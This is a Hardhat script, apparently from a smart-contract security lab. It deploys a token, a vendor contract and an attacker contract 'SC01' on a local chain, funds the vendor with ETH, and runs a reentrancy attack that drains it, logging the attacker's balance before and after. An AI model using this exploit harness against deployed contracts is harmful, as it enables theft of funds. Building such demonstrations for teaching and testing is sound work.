//@ts-nocheck
import { ethers } from "hardhat";
import { CampusToken, FHCWVendor } from "../typechain-types";
import hre from "hardhat";
import { AddressLike } from "ethers";

async function main() {

    const provider = ethers.provider;

    let owner: AddressLike;
    let addr1: AddressLike;
    let addr2: AddressLike;
    let addr3: AddressLike;

    [owner, addr1, addr2, addr3] = await hre.ethers.getSigners();
    console.log(`Addresses:\r\n
        1: ${await addr1.getAddress()}\r\n
        2: ${await addr2.getAddress()}\r\n 
        3: ${await addr3.getAddress()}\r\n`);

    const campusToken: CampusToken = await ethers.deployContract("CampusToken");
    
    await campusToken.waitForDeployment();

    console.log(`CampusToken deployed to ${campusToken.target}`);

    const vendorMachine: FHCWVendor = await ethers.deployContract("FHCWVendor", [campusToken.target])

    await vendorMachine.waitForDeployment();

    console.log(`FHCWVendor deployed to ${vendorMachine.target}`);

    const reentrancy: SC01 = await ethers.deployContract("SC01", [vendorMachine.target])

    await reentrancy.waitForDeployment();

    console.log(`SC01 deployed to ${reentrancy.target} with owner ${await reentrancy.owner()}`);

    let tx = await campusToken.grantPrivileges(vendorMachine.target)
    await tx.wait();

    console.log(await campusToken.hasPriv(vendorMachine.target) ? `Is priviliged` : `Didn't get priviliges`)

    // Equals 50.000 Tokens
    const initialVendorTokens = 500_000

    // Mint tokens for FHCWVendor and add them to the VendorContract address
    tx = await campusToken.mint(vendorMachine.target, initialVendorTokens);
    await tx.wait();

    console.log(`FHCWVendor now has ${await vendorMachine.balanceOfVendor() / BigInt(10)} Tokens`);

    // Owner transfers 10 ETH to Vendor - Needed so we can extract the funds from the Vendor in our attack
    tx = await owner.sendTransaction({
        to: vendorMachine.target,
        value: ethers.parseEther("10")
    })
    await tx.wait()

    console.log(`Vendor ETH balance: ${BigInt(await provider.getBalance(vendorMachine.target)) / BigInt(10 ** 18)}`)


    // Logs the attackers ETH balance before the attack
    const b4Attack = await provider.getBalance(addr1)
    console.log(`Attacker before attack: ${b4Attack}`)

    // Executes the reentrancy attack
    try {
        tx = await reentrancy.connect(addr1).attack({value: String(1 * 10 ** 18)})
        await tx.wait();
    } catch {
        console.log(`Transaction reverted`)
    }

    // Logs the attackers ETH balance after the attack
    const afterAttack = await provider.getBalance(addr1)
    console.log(`Attacker after attack: ${afterAttack}`)

    // Total gained ETH after attack and remaining Tokens
    console.log(`Attacker lost/gained: ${afterAttack - b4Attack}`)
    console.log(`FHCWVendor now has ${await vendorMachine.balanceOfVendor() / BigInt(10)} Tokens`);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
